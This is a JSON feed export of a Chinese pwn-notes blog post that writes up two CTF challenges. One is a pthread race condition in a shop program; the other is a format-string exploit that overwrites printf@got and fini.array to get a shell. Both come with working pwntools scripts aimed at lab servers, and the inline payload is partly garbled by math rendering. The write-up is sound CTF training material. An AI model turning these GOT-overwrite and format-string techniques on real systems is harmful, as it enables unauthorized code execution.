{
    "version": "https://jsonfeed.org/version/1",
    "title": "null • All posts by \"格式化字符串\" tag",
    "description": "欢迎来到Huan的笔记空间~这里主要会记录pwn笔记🌸",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2023/08/03/pwn1lianxi/",
            "url": "http://example.com/2023/08/03/pwn1lianxi/",
            "title": "srop",
            "date_published": "2023-08-03T14:51:25.000Z",
            "content_html": "<h1 id=\"记录两道pwn题\"><a class=\"markdownIt-Anchor\" href=\"#记录两道pwn题\">#</a> 记录两道 PWN 题</h1>\n<blockquote>\n<p>给新生出题，出累了，随便看了两个 PWN 题，发现这两个 PWN 都值得记录一下</p>\n</blockquote>\n<ul>\n<li>ONE</li>\n</ul>\n<h2 id=\"nisactf-2022shop_pwn\"><a class=\"markdownIt-Anchor\" href=\"#nisactf-2022shop_pwn\">#</a> [NISACTF 2022]shop_pwn</h2>\n<p>题目标签：</p>\n<p><img data-src=\"/img/pwnlianxiimage-20230922180317483.png\" alt=\"image-20230922180317483\"></p>\n<blockquote>\n<p>pthread_create 多线程竞争</p>\n</blockquote>\n<p><img data-src=\"/img/pwnlianxiimage-20230922180537307.png\" alt=\"image-20230922180537307\"></p>\n<p><strong>执行程序如下：</strong></p>\n<p><img data-src=\"/img/pwnlianxiimage-20230922180732045.png\" alt=\"image-20230922180732045\"></p>\n<p><strong>放入 IDA 看一下具体的函数：</strong></p>\n<p><img data-src=\"/img/pwnlianxiimage-20230922180849649.png\" alt=\"image-20230922180849649\"></p>\n<p><strong>看一下主要的函数</strong></p>\n<p><img data-src=\"/img/pwnlianxiimage-20230922181202034.png\" alt=\"image-20230922181202034\"></p>\n<p><img data-src=\"/img/pwnlianxiimage-20230922181325444.png\" alt=\"image-20230922181325444\"></p>\n<p><strong>脚本如下：</strong></p>\n<blockquote>\n<p>这里利用了 pthread_create 创建进程，那么如果我们指令发送得快的话，那么就可以实现第一次售卖功能执行的时候正在 unsleep，接着执行第二次售卖功能，那么就能卖出两次得到可以购买 flag 的金钱了</p>\n</blockquote>\n<p><strong>pwntool 的 sendline 发送指令很快</strong></p>\n<pre><code>from pwn import *\ncontext(log_level='debug',arch='amd64', os='linux')\nr = remote('node5.anna.nssctf.cn',28929)\nr.sendline(&quot;3&quot;) \nr.sendline(&quot;0&quot;) \n\nr.sendline(&quot;3&quot;)\nr.sendline(&quot;0&quot;)  \n\nr.interactive()\n</code></pre>\n<p><strong>结果如下：</strong></p>\n<p><img data-src=\"/img/pwnlianxiimage-20230922181643187.png\" alt=\"image-20230922181643187\"></p>\n<ul>\n<li>two</li>\n</ul>\n<h2 id=\"ciscn-2019西南pwn1\"><a class=\"markdownIt-Anchor\" href=\"#ciscn-2019西南pwn1\">#</a> [CISCN 2019 西南] PWN1</h2>\n<blockquote>\n<p>当 <code>RELRO</code>  保护为 <code>NO RELRO</code>  的时候， <code>init.array、fini.array、got.plt</code>  均可读可写；为 <code>PARTIAL RELRO</code>  的时候， <code>ini.array、fini.array</code>  可读不可写， <code>got.plt</code>  可读可写；为 <code>FULL RELRO</code>  时， <code>init.array、fini.array、got.plt</code>  均可读不可写。</p>\n</blockquote>\n<blockquote>\n<p>程序在加载的时候，会依次调用 <code>init.array</code>  数组中的每一个函数指针，在结束的时候，依次调用 <code>fini.array</code>  中的每一个函数指针</p>\n</blockquote>\n<blockquote>\n<p>当程序出现格式化字符串漏洞，但是需要写两次才能完成攻击，这个时候可以考虑改写 <code>fini.array</code>  中的函数指针为 <code>main</code>  函数地址，可以再执行一次 <code>main</code>  函数。一般来说，这个数组的长度为 <code>1</code> ，也就是说只能写一个地址。</p>\n</blockquote>\n<p><img data-src=\"/img/pwnlianxiimage-20230922182614061.png\" alt=\"image-20230922182614061\"></p>\n<p>32 位程序修改 got 表。</p>\n<p><strong>执行程序参看偏移：</strong></p>\n<p><img data-src=\"/img/pwnlianxiimage-20230922183714065.png\" alt=\"image-20230922183714065\"></p>\n<p><strong>看一下 IDA:</strong></p>\n<p><img data-src=\"/img/pwnlianxiimage-20230922184018564.png\" alt=\"image-20230922184018564\"></p>\n<p><img data-src=\"/img/pwnlianxiimage-20230922184142420.png\" alt=\"image-20230922184142420\"></p>\n<p><strong>利用思路：</strong></p>\n<p>通过格式化字符串漏洞去修改 printf_got，修改为 system。但是程序只能执行一次，所以修改完后，程序会退出。</p>\n<p>但是如果如下图所示</p>\n<p><img data-src=\"/img/pwnlianxiimage-20230922184525768.png\" alt=\"image-20230922184525768\"></p>\n<p>我们就可以去修改 <code>fini.array</code> , 将其参数 1，给覆写成 main，那么程序在退出后就会再次执行 main 函数。</p>\n<p><strong>payload：</strong></p>\n<blockquote>\n<p>payload = b&quot;%2052c%13<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>h</mi><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">hn%31692c%14</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">n</span></span></span></span>hn%356c%15$hn&quot; + p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)</p>\n</blockquote>\n<p>通过 gdb 去看一眼 payload 进入程序的情况：</p>\n<p><img data-src=\"/img/pwnlianxiimage-20230922185014496.png\" alt=\"image-20230922185014496\"></p>\n<p>当读入 pyload 时的情况</p>\n<p>这时程序读入 payload。现在 got 表项指向的还是 printf_plt。</p>\n<p><img data-src=\"/img/pwnlianxiimage-20230922191625014.png\" alt=\"image-20230922191625014\"></p>\n<p>当执行到 printf 函数时，printf_got 修改为 system  fini_array 的第一个参数修改为 main</p>\n<p>当我们程序结束时，就会再次跳转到 main 函数入口，在读入 /bin/sh，接着会在调用 printf 函数，会执行 system (/bin/sh)，从而获取 shell</p>\n<p><strong>exp 如下：</strong></p>\n<pre><code>from pwn import *\nr = remote('node5.anna.nssctf.cn',28467)\n# r = gdb.debug(&quot;./XNPWN1&quot;)\n# 往fini.array[0]写main@text, printf@got写system@plt\npayload = b&quot;%2052c%13$hn%31692c%14$hn%356c%15$hn&quot; + p32(0x804989c + 2) + p32(0x804989c) + p32(0x804979c)\nr.recvline()\n\nr.sendline(payload)\n\nr.sendline(&quot;/bin/sh&quot;)\nr.interactive()\n</code></pre>\n<p><strong>结果：</strong></p>\n",
            "tags": [
                "格式化字符串",
                "got表"
            ]
        }
    ]
}